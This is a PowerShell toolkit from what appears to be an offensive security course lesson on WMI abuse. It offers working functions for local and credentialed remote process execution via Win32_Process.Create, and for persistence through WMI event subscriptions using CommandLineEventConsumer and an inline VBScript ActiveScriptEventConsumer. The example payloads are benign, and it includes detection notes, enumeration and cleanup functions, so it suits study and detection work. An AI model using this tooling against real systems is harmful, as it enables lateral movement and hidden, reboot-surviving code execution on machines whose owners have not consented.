# ============================================================================
# WMI Execution and Persistence - Module 07, Lesson 05
# Defense Evasion Course - LOLBins: Living Off The Land
# ============================================================================
#
# DISCLAIMER: This code is provided for authorized security research,
# penetration testing, and educational purposes only. Unauthorized use of
# these techniques against systems you do not own or have explicit written
# permission to test is illegal and unethical.
#
# DESCRIPTION:
#   PowerShell script demonstrating WMI-based execution and persistence
#   techniques. Includes Win32_Process.Create for local/remote execution
#   and WMI event subscriptions for persistence.
#
# USAGE:
#   . .\wmi_execution.ps1
#   Invoke-WMILocalExecution -ProcessPath "calc.exe"
#   Invoke-WMIRemoteExecution -Target "192.168.1.100" -ProcessPath "calc.exe" -Credential (Get-Credential)
#   Install-WMISubscription -Name "DemoSub" -Command "calc.exe"
#   Get-WMISubscriptions
#   Remove-WMISubscription -Name "DemoSub"
#
# DETECTION NOTES:
#   - WMI activity is logged in Microsoft-Windows-WMI-Activity/Operational
#   - Sysmon Events 19-21 track subscription creation
#   - PowerShell ScriptBlock logging captures these commands
#   - WmiPrvSE.exe child processes indicate WMI execution
#
# ============================================================================

#Requires -Version 3.0

Set-StrictMode -Version Latest

# ============================================================================
# Function: Invoke-WMILocalExecution
# Description: Execute a process locally using Win32_Process.Create via WMI
# ============================================================================

function Invoke-WMILocalExecution {
    <#
    .SYNOPSIS
        Executes a process locally using WMI Win32_Process.Create.

    .DESCRIPTION
        Uses WMI to create a new process on the local system. The spawned
        process will have WmiPrvSE.exe as its parent process, which is a
        known indicator but also a legitimate WMI behavior.

    .PARAMETER ProcessPath
        The command line to execute (e.g., "calc.exe", "cmd.exe /c whoami")

    .PARAMETER WorkingDirectory
        Optional working directory for the new process.

    .EXAMPLE
        Invoke-WMILocalExecution -ProcessPath "calc.exe"
        Invoke-WMILocalExecution -ProcessPath "cmd.exe /c whoami > C:\temp\out.txt"
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ProcessPath,

        [Parameter(Mandatory = $false)]
        [string]$WorkingDirectory = $null
    )

    Write-Host "[*] WMI Local Execution" -ForegroundColor Cyan
    Write-Host "[*] Target command: $ProcessPath" -ForegroundColor Cyan

    try {
        # Method 1: Invoke-WmiMethod (legacy, DCOM-based)
        Write-Host "[*] Using Invoke-WmiMethod (Win32_Process.Create)..." -ForegroundColor Yellow

        $result = Invoke-WmiMethod -Class Win32_Process `
                                   -Name Create `
                                   -ArgumentList $ProcessPath

        if ($result.ReturnValue -eq 0) {
            Write-Host "[+] Process created successfully!" -ForegroundColor Green
            Write-Host "[+] Process ID: $($result.ProcessId)" -ForegroundColor Green
        } else {
            Write-Host "[-] Process creation failed. Return value: $($result.ReturnValue)" -ForegroundColor Red
            Write-Host "[-] Return values: 0=Success, 2=Access Denied, 3=Insufficient Privilege, 8=Unknown Failure, 9=Path Not Found, 21=Invalid Parameter" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
    }

    Write-Host ""

    try {
        # Method 2: Invoke-CimMethod (modern, supports WinRM)
        Write-Host "[*] Using Invoke-CimMethod (CIM alternative)..." -ForegroundColor Yellow

        $cimResult = Invoke-CimMethod -ClassName Win32_Process `
                                       -MethodName Create `
                                       -Arguments @{CommandLine = $ProcessPath}

        if ($cimResult.ReturnValue -eq 0) {
            Write-Host "[+] Process created successfully (CIM)!" -ForegroundColor Green
            Write-Host "[+] Process ID: $($cimResult.ProcessId)" -ForegroundColor Green
        } else {
            Write-Host "[-] CIM process creation failed. Return value: $($cimResult.ReturnValue)" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[-] CIM Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ============================================================================
# Function: Invoke-WMIRemoteExecution
# Description: Execute a process on a remote system using WMI over DCOM
# ============================================================================

function Invoke-WMIRemoteExecution {
    <#
    .SYNOPSIS
        Executes a process on a remote system using WMI.

    .DESCRIPTION
        Uses WMI over DCOM to create a process on a remote system.
        Requires local administrator credentials on the target.
        The spawned process parent will be WmiPrvSE.exe on the target.

    .PARAMETER Target
        The hostname or IP address of the target system.

    .PARAMETER ProcessPath
        The command line to execute on the remote system.

    .PARAMETER Credential
        PSCredential object with admin credentials for the target.

    .EXAMPLE
        $cred = Get-Credential
        Invoke-WMIRemoteExecution -Target "192.168.1.100" -ProcessPath "calc.exe" -Credential $cred
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Target,

        [Parameter(Mandatory = $true)]
        [string]$ProcessPath,

        [Parameter(Mandatory = $true)]
        [System.Management.Automation.PSCredential]$Credential
    )

    Write-Host "[*] WMI Remote Execution" -ForegroundColor Cyan
    Write-Host "[*] Target: $Target" -ForegroundColor Cyan
    Write-Host "[*] Command: $ProcessPath" -ForegroundColor Cyan

    try {
        # Method 1: DCOM transport (traditional WMI)
        Write-Host "[*] Attempting DCOM-based WMI execution..." -ForegroundColor Yellow

        $result = Invoke-WmiMethod -Class Win32_Process `
                                   -Name Create `
                                   -ArgumentList $ProcessPath `
                                   -ComputerName $Target `
                                   -Credential $Credential

        if ($result.ReturnValue -eq 0) {
            Write-Host "[+] Remote process created (DCOM)!" -ForegroundColor Green
            Write-Host "[+] Remote PID: $($result.ProcessId)" -ForegroundColor Green
        } else {
            Write-Host "[-] Failed. Return value: $($result.ReturnValue)" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[-] DCOM Error: $($_.Exception.Message)" -ForegroundColor Red
    }

    Write-Host ""

    try {
        # Method 2: WinRM transport (via CIM Session)
        Write-Host "[*] Attempting WinRM-based CIM execution..." -ForegroundColor Yellow

        $sessionOption = New-CimSessionOption -Protocol Wsman
        $session = New-CimSession -ComputerName $Target `
                                   -Credential $Credential `
                                   -SessionOption $sessionOption

        $cimResult = Invoke-CimMethod -ClassName Win32_Process `
                                       -MethodName Create `
                                       -Arguments @{CommandLine = $ProcessPath} `
                                       -CimSession $session

        if ($cimResult.ReturnValue -eq 0) {
            Write-Host "[+] Remote process created (WinRM)!" -ForegroundColor Green
            Write-Host "[+] Remote PID: $($cimResult.ProcessId)" -ForegroundColor Green
        } else {
            Write-Host "[-] Failed. Return value: $($cimResult.ReturnValue)" -ForegroundColor Red
        }

        Remove-CimSession -CimSession $session
    }
    catch {
        Write-Host "[-] WinRM Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ============================================================================
# Function: Install-WMISubscription
# Description: Create a WMI event subscription for persistence
# ============================================================================

function Install-WMISubscription {
    <#
    .SYNOPSIS
        Creates a WMI event subscription for persistence.

    .DESCRIPTION
        Creates a three-part WMI event subscription:
          1. __EventFilter - Defines the triggering condition (WQL query)
          2. CommandLineEventConsumer - Defines the action (command to run)
          3. __FilterToConsumerBinding - Links the filter to the consumer

        The subscription persists in the CIM repository and survives reboots.

    .PARAMETER Name
        Base name for the subscription components.

    .PARAMETER Command
        Command line to execute when the event fires.

    .PARAMETER IntervalSeconds
        Polling interval for the event query (default: 300 seconds / 5 minutes).

    .EXAMPLE
        Install-WMISubscription -Name "DemoSub" -Command "calc.exe"
        Install-WMISubscription -Name "PersistDemo" -Command "cmd.exe /c echo test > C:\temp\wmi_test.txt" -IntervalSeconds 60
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$Command,

        [Parameter(Mandatory = $false)]
        [int]$IntervalSeconds = 300
    )

    Write-Host "[*] Installing WMI Event Subscription" -ForegroundColor Cyan
    Write-Host "[*] Name: $Name" -ForegroundColor Cyan
    Write-Host "[*] Command: $Command" -ForegroundColor Cyan
    Write-Host "[*] Interval: ${IntervalSeconds}s" -ForegroundColor Cyan

    try {
        # =====================================================================
        # Step 1: Create the Event Filter
        # =====================================================================
        # This WQL query triggers based on system uptime, firing once when
        # the uptime exceeds a threshold. Adjust the query for different
        # trigger conditions (logon events, time-based, process creation, etc.)
        # =====================================================================

        $filterName = "${Name}_Filter"
        $query = "SELECT * FROM __InstanceModificationEvent WITHIN $IntervalSeconds WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240"

        Write-Host "[*] Creating Event Filter: $filterName" -ForegroundColor Yellow

        $filterArgs = @{
            EventNamespace = 'root\cimv2'
            Name           = $filterName
            Query          = $query
            QueryLanguage  = 'WQL'
        }

        $filter = Set-WmiInstance -Namespace root\subscription `
                                   -Class __EventFilter `
                                   -Arguments $filterArgs

        Write-Host "[+] Event Filter created" -ForegroundColor Green

        # =====================================================================
        # Step 2: Create the Event Consumer
        # =====================================================================
        # CommandLineEventConsumer executes a command when triggered.
        # Alternative: ActiveScriptEventConsumer for inline script execution.
        # =====================================================================

        $consumerName = "${Name}_Consumer"

        Write-Host "[*] Creating Event Consumer: $consumerName" -ForegroundColor Yellow

        $consumerArgs = @{
            Name                 = $consumerName
            CommandLineTemplate  = $Command
        }

        $consumer = Set-WmiInstance -Namespace root\subscription `
                                     -Class CommandLineEventConsumer `
                                     -Arguments $consumerArgs

        Write-Host "[+] Event Consumer created" -ForegroundColor Green

        # =====================================================================
        # Step 3: Create the Binding
        # =====================================================================
        # Links the filter to the consumer. Without this binding,
        # the subscription will not function.
        # =====================================================================

        Write-Host "[*] Creating Filter-to-Consumer Binding..." -ForegroundColor Yellow

        $bindingArgs = @{
            Filter   = $filter
            Consumer = $consumer
        }

        $binding = Set-WmiInstance -Namespace root\subscription `
                                    -Class __FilterToConsumerBinding `
                                    -Arguments $bindingArgs

        Write-Host "[+] Binding created" -ForegroundColor Green
        Write-Host "[+] WMI subscription installed successfully!" -ForegroundColor Green
        Write-Host "[+] The command will execute when the WQL query condition is met." -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Error installing subscription: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ============================================================================
# Function: Install-WMIScriptSubscription
# Description: Create a WMI event subscription using ActiveScriptEventConsumer
# ============================================================================

function Install-WMIScriptSubscription {
    <#
    .SYNOPSIS
        Creates a WMI subscription with inline VBScript execution.

    .DESCRIPTION
        Uses ActiveScriptEventConsumer instead of CommandLineEventConsumer.
        This allows inline VBScript or JScript code execution without
        spawning a visible process.

    .PARAMETER Name
        Base name for the subscription components.

    .PARAMETER ScriptText
        VBScript code to execute when the event fires.

    .EXAMPLE
        Install-WMIScriptSubscription -Name "ScriptSub" -ScriptText 'Set oShell = CreateObject("WScript.Shell") : oShell.Run "calc.exe"'
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,

        [Parameter(Mandatory = $true)]
        [string]$ScriptText
    )

    Write-Host "[*] Installing WMI Script Subscription" -ForegroundColor Cyan

    try {
        # Event Filter - fires on startup (uptime check)
        $filter = Set-WmiInstance -Namespace root\subscription `
            -Class __EventFilter `
            -Arguments @{
                EventNamespace = 'root\cimv2'
                Name           = "${Name}_ScriptFilter"
                Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
                QueryLanguage  = 'WQL'
            }

        # ActiveScriptEventConsumer - executes VBScript inline
        $consumer = Set-WmiInstance -Namespace root\subscription `
            -Class ActiveScriptEventConsumer `
            -Arguments @{
                Name           = "${Name}_ScriptConsumer"
                ScriptingEngine = 'VBScript'
                ScriptText     = $ScriptText
            }

        # Binding
        Set-WmiInstance -Namespace root\subscription `
            -Class __FilterToConsumerBinding `
            -Arguments @{
                Filter   = $filter
                Consumer = $consumer
            } | Out-Null

        Write-Host "[+] Script subscription installed" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ============================================================================
# Function: Get-WMISubscriptions
# Description: Enumerate all WMI event subscriptions
# ============================================================================

function Get-WMISubscriptions {
    <#
    .SYNOPSIS
        Lists all WMI event subscriptions on the system.

    .DESCRIPTION
        Enumerates EventFilters, EventConsumers, and Bindings in the
        root\subscription namespace. Useful for both offensive (recon)
        and defensive (audit) purposes.

    .EXAMPLE
        Get-WMISubscriptions
    #>

    [CmdletBinding()]
    param()

    Write-Host "[*] Enumerating WMI Event Subscriptions" -ForegroundColor Cyan
    Write-Host "=" * 60

    # Event Filters
    Write-Host "`n[*] Event Filters:" -ForegroundColor Yellow
    $filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter 2>$null
    if ($filters) {
        foreach ($f in $filters) {
            Write-Host "    Name: $($f.Name)" -ForegroundColor White
            Write-Host "    Query: $($f.Query)" -ForegroundColor Gray
            Write-Host ""
        }
    } else {
        Write-Host "    (none found)" -ForegroundColor Gray
    }

    # Event Consumers
    Write-Host "[*] Event Consumers:" -ForegroundColor Yellow
    $consumers = @()
    $consumers += Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer 2>$null
    $consumers += Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer 2>$null

    if ($consumers) {
        foreach ($c in $consumers) {
            Write-Host "    Name: $($c.Name)" -ForegroundColor White
            if ($c.CommandLineTemplate) {
                Write-Host "    Type: CommandLine" -ForegroundColor Gray
                Write-Host "    Command: $($c.CommandLineTemplate)" -ForegroundColor Gray
            }
            if ($c.ScriptText) {
                Write-Host "    Type: ActiveScript ($($c.ScriptingEngine))" -ForegroundColor Gray
                Write-Host "    Script: $($c.ScriptText.Substring(0, [Math]::Min(100, $c.ScriptText.Length)))..." -ForegroundColor Gray
            }
            Write-Host ""
        }
    } else {
        Write-Host "    (none found)" -ForegroundColor Gray
    }

    # Bindings
    Write-Host "[*] Bindings:" -ForegroundColor Yellow
    $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding 2>$null
    if ($bindings) {
        foreach ($b in $bindings) {
            Write-Host "    Filter: $($b.Filter)" -ForegroundColor Gray
            Write-Host "    Consumer: $($b.Consumer)" -ForegroundColor Gray
            Write-Host ""
        }
    } else {
        Write-Host "    (none found)" -ForegroundColor Gray
    }
}

# ============================================================================
# Function: Remove-WMISubscription
# Description: Remove a WMI event subscription by name
# ============================================================================

function Remove-WMISubscription {
    <#
    .SYNOPSIS
        Removes a WMI event subscription and all its components.

    .PARAMETER Name
        Base name of the subscription to remove (matches filter and consumer names).

    .EXAMPLE
        Remove-WMISubscription -Name "DemoSub"
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    Write-Host "[*] Removing WMI Subscription: $Name" -ForegroundColor Cyan

    try {
        # Remove bindings first (references filter and consumer)
        $bindings = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding 2>$null |
            Where-Object { $_.Filter -match $Name -or $_.Consumer -match $Name }
        foreach ($b in $bindings) {
            $b | Remove-WmiObject
            Write-Host "[+] Removed binding" -ForegroundColor Green
        }

        # Remove filters
        $filters = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name LIKE '%${Name}%'" 2>$null
        foreach ($f in $filters) {
            $f | Remove-WmiObject
            Write-Host "[+] Removed filter: $($f.Name)" -ForegroundColor Green
        }

        # Remove consumers (check both types)
        $cmdConsumers = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name LIKE '%${Name}%'" 2>$null
        foreach ($c in $cmdConsumers) {
            $c | Remove-WmiObject
            Write-Host "[+] Removed command consumer: $($c.Name)" -ForegroundColor Green
        }

        $scriptConsumers = Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer -Filter "Name LIKE '%${Name}%'" 2>$null
        foreach ($c in $scriptConsumers) {
            $c | Remove-WmiObject
            Write-Host "[+] Removed script consumer: $($c.Name)" -ForegroundColor Green
        }

        Write-Host "[+] Subscription removal complete" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Error removing subscription: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ============================================================================
# Main: Display usage information
# ============================================================================

Write-Host @"

============================================================
  WMI Execution and Persistence Toolkit
  Module 07, Lesson 05 - LOLBins: Living Off The Land
============================================================

Available Functions:

  Invoke-WMILocalExecution
    - Execute a process locally via Win32_Process.Create
    - Usage: Invoke-WMILocalExecution -ProcessPath "calc.exe"

  Invoke-WMIRemoteExecution
    - Execute a process on a remote system via WMI
    - Usage: Invoke-WMIRemoteExecution -Target "HOST" -ProcessPath "calc.exe" -Credential (Get-Credential)

  Install-WMISubscription
    - Create a persistent WMI event subscription (CommandLine)
    - Usage: Install-WMISubscription -Name "Demo" -Command "calc.exe"

  Install-WMIScriptSubscription
    - Create a persistent WMI subscription (ActiveScript/VBScript)
    - Usage: Install-WMIScriptSubscription -Name "Demo" -ScriptText 'MsgBox "Hello"'

  Get-WMISubscriptions
    - Enumerate all WMI event subscriptions
    - Usage: Get-WMISubscriptions

  Remove-WMISubscription
    - Remove a WMI event subscription by name
    - Usage: Remove-WMISubscription -Name "Demo"

============================================================
"@ -ForegroundColor Cyan
